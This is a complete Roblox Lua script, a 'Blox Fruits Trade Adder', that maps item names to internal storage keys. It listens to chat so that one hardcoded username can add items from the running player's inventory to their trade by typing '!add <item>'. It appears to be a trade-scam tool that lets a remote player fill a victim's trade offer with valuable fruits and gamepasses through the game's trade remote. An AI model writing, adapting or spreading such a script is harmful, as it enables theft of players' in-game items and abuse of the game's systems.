
-- =========================================================
-- BLOX FRUITS TRADE ADDER - VERSION 6
-- Authorized Username + StorageKey Based
-- =========================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

local LocalPlayer = Players.LocalPlayer

local TradeFunction = ReplicatedStorage
    :WaitForChild("Remotes")
    :WaitForChild("TradeFunction")

-- =========================================================
-- 1. CONFIGURATION
-- =========================================================

local AUTHORIZED_USERNAME = "BLACKGOKU_0707"
local COMMAND_PREFIX = "!add "
local DUPLICATE_COOLDOWN = 1.0

-- Disconnect previous listeners
if _G.TradeAddConnections then
    for _, connection in ipairs(_G.TradeAddConnections) do
        pcall(function()
            connection:Disconnect()
        end)
    end
end

_G.TradeAddConnections = {}

-- =========================================================
-- 2. ITEM KEY REGISTRY
-- =========================================================

local ItemKeys = {

    -- PHYSICAL FRUITS

    ["rocket"] = "Rocket-Rocket",
    ["spin"] = "Spin-Spin",
    ["blade"] = "Blade-Blade",
    ["chop"] = "Blade-Blade",
    ["spring"] = "Spring-Spring",
    ["bomb"] = "Bomb-Bomb",
    ["smoke"] = "Smoke-Smoke",
    ["spike"] = "Spike-Spike",

    ["flame"] = "Flame-Flame",
    ["ice"] = "Ice-Ice",
    ["sand"] = "Sand-Sand",
    ["dark"] = "Dark-Dark",
    ["eagle"] = "Eagle-Eagle",
    ["falcon"] = "Eagle-Eagle",
    ["diamond"] = "Diamond-Diamond",

    ["light"] = "Light-Light",
    ["rubber"] = "Rubber-Rubber",
    ["ghost"] = "Ghost-Ghost",
    ["revive"] = "Ghost-Ghost",
    ["magma"] = "Magma-Magma",

    ["quake"] = "Quake-Quake",
    ["buddha"] = "Buddha-Buddha",
    ["love"] = "Love-Love",
    ["creation"] = "Creation-Creation",
    ["barrier"] = "Creation-Creation",
    ["spider"] = "Spider-Spider",
    ["sound"] = "Sound-Sound",
    ["phoenix"] = "Phoenix-Phoenix",
    ["portal"] = "Portal-Portal",
    ["door"] = "Portal-Portal",
    ["lightning"] = "Lightning-Lightning",
    ["rumble"] = "Lightning-Lightning",
    ["pain"] = "Pain-Pain",
    ["paw"] = "Pain-Pain",
    ["blizzard"] = "Blizzard-Blizzard",

    ["gravity"] = "Gravity-Gravity",
    ["mammoth"] = "Mammoth-Mammoth",
    ["trex"] = "T-Rex-T-Rex",
    ["t-rex"] = "T-Rex-T-Rex",
    ["dough"] = "Dough-Dough",
    ["shadow"] = "Shadow-Shadow",
    ["venom"] = "Venom-Venom",
    ["gas"] = "Gas-Gas",
    ["spirit"] = "Spirit-Spirit",
    ["soul"] = "Spirit-Spirit",
    ["tiger"] = "Tiger-Tiger",
    ["leopard"] = "Tiger-Tiger",
    ["yeti"] = "Yeti-Yeti",
    ["magnet"] = "Magnet-Magnet",
    ["kitsune"] = "Kitsune-Kitsune",
    ["control"] = "Control-Control",
    ["dragon"] = "Dragon-Dragon",
    ["dragon west"] = "Dragon (West)-Dragon (West)",
    ["dragon east"] = "Dragon (East)-Dragon (East)",
    ["west dragon"] = "Dragon (West)-Dragon (West)",
    ["east dragon"] = "Dragon (East)-Dragon (East)",

    -- PERMANENT FRUITS

    ["perm rocket"] = "Permanent Rocket-Rocket",
    ["perm spin"] = "Permanent Spin-Spin",
    ["perm blade"] = "Permanent Blade-Blade",
    ["perm chop"] = "Permanent Blade-Blade",
    ["perm spring"] = "Permanent Spring-Spring",
    ["perm bomb"] = "Permanent Bomb-Bomb",
    ["perm smoke"] = "Permanent Smoke-Smoke",
    ["perm spike"] = "Permanent Spike-Spike",

    ["perm flame"] = "Permanent Flame-Flame",
    ["perm ice"] = "Permanent Ice-Ice",
    ["perm sand"] = "Permanent Sand-Sand",
    ["perm dark"] = "Permanent Dark-Dark",
    ["perm eagle"] = "Permanent Eagle-Eagle",
    ["perm falcon"] = "Permanent Eagle-Eagle",
    ["perm diamond"] = "Permanent Diamond-Diamond",

    ["perm light"] = "Permanent Light-Light",
    ["perm rubber"] = "Permanent Rubber-Rubber",
    ["perm ghost"] = "Permanent Ghost-Ghost",
    ["perm revive"] = "Permanent Ghost-Ghost",
    ["perm magma"] = "Permanent Magma-Magma",

    ["perm quake"] = "Permanent Quake-Quake",
    ["perm buddha"] = "Permanent Buddha-Buddha",
    ["perm love"] = "Permanent Love-Love",
    ["perm creation"] = "Permanent Creation-Creation",
    ["perm barrier"] = "Permanent Creation-Creation",
    ["perm spider"] = "Permanent Spider-Spider",
    ["perm sound"] = "Permanent Sound-Sound",
    ["perm phoenix"] = "Permanent Phoenix-Phoenix",
    ["perm portal"] = "Permanent Portal-Portal",
    ["perm door"] = "Permanent Portal-Portal",
    ["perm lightning"] = "Permanent Lightning-Lightning",
    ["perm rumble"] = "Permanent Lightning-Lightning",
    ["perm pain"] = "Permanent Pain-Pain",
    ["perm paw"] = "Permanent Pain-Pain",
    ["perm blizzard"] = "Permanent Blizzard-Blizzard",

    ["perm gravity"] = "Permanent Gravity-Gravity",
    ["perm mammoth"] = "Permanent Mammoth-Mammoth",
    ["perm trex"] = "Permanent T-Rex-T-Rex",
    ["perm t-rex"] = "Permanent T-Rex-T-Rex",
    ["perm dough"] = "Permanent Dough-Dough",
    ["perm shadow"] = "Permanent Shadow-Shadow",
    ["perm venom"] = "Permanent Venom-Venom",
    ["perm gas"] = "Permanent Gas-Gas",
    ["perm spirit"] = "Permanent Spirit-Spirit",
    ["perm soul"] = "Permanent Spirit-Spirit",
    ["perm tiger"] = "Permanent Tiger-Tiger",
    ["perm leopard"] = "Permanent Tiger-Tiger",
    ["perm yeti"] = "Permanent Yeti-Yeti",
    ["perm magnet"] = "Permanent Magnet-Magnet",
    ["perm kitsune"] = "Permanent Kitsune-Kitsune",
    ["perm control"] = "Permanent Control-Control",
    ["perm dragon"] = "Permanent Dragon-Dragon",
    ["perm dragon token"] = "Permanent Dragon Token",

    -- GAMEPASSES AND TOKENS

    ["fruit notifier"] = "Fruit Notifier",
    ["notifier"] = "Fruit Notifier",
    ["dark blade"] = "Dark Blade",
    ["db"] = "Dark Blade",
    ["2x mastery"] = "2x Mastery",
    ["2x money"] = "2x Money",
    ["2x boss drops"] = "2x Boss Drops",
    ["fast boats"] = "Fast Boats",
    ["fruit storage"] = "+1 Fruit Storage",
    ["+1 storage"] = "+1 Fruit Storage",
    ["storage"] = "+1 Fruit Storage",
    ["3x mythical scrolls"] = "3x Mythical Scrolls",
    ["5x legendary scrolls"] = "5x Legendary Scrolls",
    ["dragon token"] = "Dragon Token (Tradable)",

    -- DRAGON WEST SKINS

    ["west ember"] = "WSTDSKINember",
    ["west eclipse"] = "WSTDSKINeclipse",
    ["west blood moon"] = "WSTDSKINbloodmoon",
    ["west phoenix sky"] = "WSTDSKINphoenixsky",
    ["west violet night"] = "WSTDSKINvioletnight",

    -- DRAGON EAST SKINS

    ["east ember"] = "ESTDSKINember",
    ["east eclipse"] = "ESTDSKINeclipse",
    ["east blood moon"] = "ESTDSKINbloodmoon",
    ["east phoenix sky"] = "ESTDSKINphoenixsky",
    ["east violet night"] = "ESTDSKINvioletnight",

    -- DRAGON CHROMATICS

    ["ember dragon"] = "EmberChromaticDragon",
    ["eclipse dragon"] = "EclipseChromaticDragon",
    ["blood moon dragon"] = "BloodmoonChromaticDragon",
    ["phoenix sky dragon"] = "PhoenixSkyChromaticDragon",
    ["violet night dragon"] = "VioletNightChromaticDragon",

    -- KITSUNE SKINS

    ["empyrean kitsune"] = "Empyrean (Kitsune)-Empyrean (Kitsune)",
    ["crimson kitsune"] = "KYUKONSKINcrimson",
    ["galaxy kitsune"] = "KYUKONSKINgalaxy",

    -- PAIN SKINS

    ["sadness pain"] = "Sadness Pain",
    ["torment pain"] = "Torment Pain",
    ["frustration pain"] = "Frustration Pain",
    ["celestial pain"] = "PAINSKINcelestial",
    ["super spirit pain"] = "PAINSKINsuperspirit",

    -- LIGHTNING SKINS

    ["yellow lightning"] = "LIGHTNINGSKINyellow",
    ["purple lightning"] = "LIGHTNINGSKINpurple",
    ["green lightning"] = "LIGHTNINGSKINgreen",
    ["red lightning"] = "LIGHTNINGSKINred",
    ["blue lightning"] = "LIGHTNINGSKINblue",

    -- PORTAL SKINS

    ["divine portal"] = "PORTALSKINdivine",
    ["pink portal"] = "PORTALSKINpink",
    ["orange portal"] = "PORTALSKINorange",
    ["blue portal"] = "PORTALSKINblue",

    -- DIAMOND SKINS

    ["emerald diamond"] = "DIAMONDSKINgreen",
    ["rose quartz diamond"] = "DIAMONDSKINpoudretteite",
    ["topaz diamond"] = "DIAMONDSKINtopaz",
    ["ruby diamond"] = "DIAMONDSKINred",

    -- EAGLE SKINS

    ["glacier eagle"] = "FALCSKINglacier",
    ["requiem eagle"] = "FALCSKINrequiem",
    ["matrix eagle"] = "FALCSKINmatrix",
    ["parrot eagle"] = "FALCSKINparrot",

    -- BOMB SKINS

    ["nuclear bomb"] = "BOMBSKINnuclear",
    ["thermite bomb"] = "BOMBSKINthermite",
    ["azura bomb"] = "BOMBSKINazura",
    ["celebration bomb"] = "BOMBSKINcelebration",

    -- MAGNET SKIN

    ["arcsteel magnet"] = "MAGNETSKINarksteel",

    -- YETI SKINS AND MUTATIONS

    ["runic yeti"] = "FIENDSKINsealed",
    ["fiend yeti"] = "YETISKINfiend",
    ["fiend yeti fruit"] = "Fiend (Yeti)-Fiend (Yeti)",

    -- GRAVITY SKIN

    ["starlight gravity"] = "GRAVITYSKINheavenly",
    ["heavenly gravity"] = "GRAVITYSKINheavenly",

    -- BLADE SKIN

    ["lime blade"] = "BLADESKINlime",

    -- TIGER SKIN AND MUTATION

    ["werewolf tiger"] = "TIGERSKINwerewolf",
    ["werewolf fruit"] = "Werewolf (Tiger)-Werewolf (Tiger)",

    -- GAS SKIN AND MUTATION

    ["hellfire gas"] = "HELLFIRESKINdefault",
    ["hellfire fruit"] = "Hellfire (Gas)-Hellfire (Gas)",

    -- LIMITED BANNERS AND SWORD SKINS

    ["dog blade"] = "The Sword Of The Brat",
    ["brat sword"] = "The Sword Of The Brat",
    ["rabid skin"] = "BRATSKINslayer",
    ["dog house"] = "DogHouseGacha26",
    ["heartbreak frame"] = "Heartbreak",
    ["aurora frame"] = "Aurora Sky",
    ["lover frame"] = "Lover",
}

-- =========================================================
-- 3. NORMALIZE INPUT
-- =========================================================

local function normalizeInput(name)

    if type(name) ~= "string" then
        return nil
    end

    name = name:lower()
    name = name:match("^%s*(.-)%s*$")
    name = name:gsub("^<(.-)>$", "%1")
    name = name:match("^%s*(.-)%s*$")

    if name == "" then
        return nil
    end

    return name
end

-- =========================================================
-- 4. RESOLVE STORAGE KEY
-- =========================================================

local function findStorageKey(rawInput)

    local query = normalizeInput(rawInput)

    if not query then
        return nil, "invalid"
    end

    -- Exact matching
    local storageKey = ItemKeys[query]

    if storageKey then
        return storageKey, "exact"
    end

    -- Unique partial matching
    local matches = {}

    for alias, key in pairs(ItemKeys) do

        if alias:find(query, 1, true) then
            matches[key] = true
        end

    end

    local count = 0
    local result

    for key in pairs(matches) do
        count += 1
        result = key
    end

    if count == 1 then
        return result, "partial"
    elseif count > 1 then
        return nil, "ambiguous"
    end

    return nil, "not_found"
end

-- =========================================================
-- 5. AUTHORIZED COMMAND HANDLER
-- =========================================================

local lastText = ""
local lastTime = 0

local function handleChatCommand(rawText, speaker)

    -- Check sender
    if not speaker or speaker.Name:lower()
        ~= AUTHORIZED_USERNAME:lower() then
        return
    end

    if type(rawText) ~= "string" then
        return
    end

    local cleanText = rawText:match("^%s*(.-)%s*$")
    local lowerText = cleanText:lower()

    if lowerText:sub(1, #COMMAND_PREFIX)
        ~= COMMAND_PREFIX then
        return
    end

    -- Duplicate protection
    local now = os.clock()

    local commandId = tostring(speaker.UserId)
        .. ":" .. lowerText

    if commandId == lastText
        and (now - lastTime) < DUPLICATE_COOLDOWN then
        return
    end

    lastText = commandId
    lastTime = now

    local targetInput =
        cleanText:sub(#COMMAND_PREFIX + 1)

    local storageKey, matchType =
        findStorageKey(targetInput)

    if not storageKey then

        if matchType == "ambiguous" then
            warn(
                "[Trade] Multiple matching items:",
                targetInput,
                "| Use a more specific name."
            )
        else
            warn(
                "[Trade] Item not found:",
                targetInput
            )
        end

        return
    end

    -- =====================================================
    -- SEND STORAGE KEY TO YOUR LOCAL TRADE
    -- =====================================================

    local ok, result = pcall(function()

        return TradeFunction:InvokeServer(
            "addItem",
            storageKey,
            1
        )

    end)

    if ok then

        print(
            "[Trade] Request sent!",
            "| Sender:",
            speaker.Name,
            "| Item:",
            targetInput,
            "| StorageKey:",
            storageKey,
            "| Match:",
            matchType
        )

    else

        warn(
            "[Trade] Trade request failed:",
            result
        )

    end

end

-- =========================================================
-- 6. CHAT LISTENERS
-- =========================================================

local function connectPlayer(player)

    -- Only connect the authorized player's chat
    if player.Name:lower()
        ~= AUTHORIZED_USERNAME:lower() then
        return
    end

    -- Legacy chat support
    if TextChatService.ChatVersion
        ~= Enum.ChatVersion.TextChatService then

        local connection = player.Chatted:Connect(
            function(message)
                handleChatCommand(message, player)
            end
        )

        table.insert(
            _G.TradeAddConnections,
            connection
        )

    end

end

if TextChatService.ChatVersion
    == Enum.ChatVersion.TextChatService then

    -- Modern chat: receive messages from all players,
    -- but process commands only from the authorized user.

    table.insert(
        _G.TradeAddConnections,

        TextChatService.MessageReceived:Connect(
            function(msg)

                if not msg.TextSource then
                    return
                end

                local speaker = Players:GetPlayerByUserId(
                    msg.TextSource.UserId
                )

                if not speaker then
                    return
                end

                handleChatCommand(msg.Text, speaker)

            end
        )
    )

else

    -- Legacy chat
    for _, player in ipairs(Players:GetPlayers()) do
        connectPlayer(player)
    end

    table.insert(
        _G.TradeAddConnections,

        Players.PlayerAdded:Connect(connectPlayer)
    )

end

-- =========================================================
-- 7. READY
-- =========================================================

print("========================================")
print("[Trade] Version 6 loaded!")
print("[Trade] StorageKey resolver active.")
print("[Trade] Authorized user:", AUTHORIZED_USERNAME)
print("[Trade] Only authorized user can use !add")
print("[Trade] Commands: !add <item>")
print("[Trade] Commands: !add perm <fruit>")
print("========================================")
